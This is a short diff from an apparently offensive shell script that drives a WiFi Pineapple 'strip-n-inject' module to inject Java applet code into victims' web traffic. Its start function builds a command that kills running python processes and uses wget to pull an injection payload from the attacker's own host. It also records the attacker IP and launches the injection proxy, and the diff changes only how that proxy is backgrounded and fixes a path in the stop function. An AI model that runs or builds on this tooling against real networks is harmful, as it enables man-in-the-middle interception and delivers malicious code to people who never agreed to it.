@@ -133,12 +133,12 @@ function start_javaappletinjector(){
 
   # Start up code injector for java applet injection
   echo -e "\e[01;34m[>]\e[00m Enabling code injection on pineapple.."    
-  command="killall -9 python ; wget -O /pineapple/components/infusions/strip-n-inject/includes/proxy/injection.txt http://${our_ip}/injectme.txt ; echo ${our_ip} > /pineapple/components/infusions/strip-n-inject/includes/proxy/attacker_ip.txt ; cd /pineapple/components/infusions/strip-n-inject/includes/ ; bash start.sh | at now"
+  command="killall -9 python ; wget -O /pineapple/components/infusions/strip-n-inject/includes/proxy/injection.txt http://${our_ip}/injectme.txt ; echo ${our_ip} > /pineapple/components/infusions/strip-n-inject/includes/proxy/attacker_ip.txt ; cd /pineapple/components/infusions/strip-n-inject/includes/ ; bash start.sh &"
   pineapple_command
 }
 
 # Stop Function
 function stop_javaappletinjector(){
-  command="cd /pineapple/components/infusions/codeinject/includes/ ; bash stop.sh"
+  command="cd /pineapple/components/infusions/strip-n-inject/includes/ ; bash stop.sh"
   pineapple_command
 }
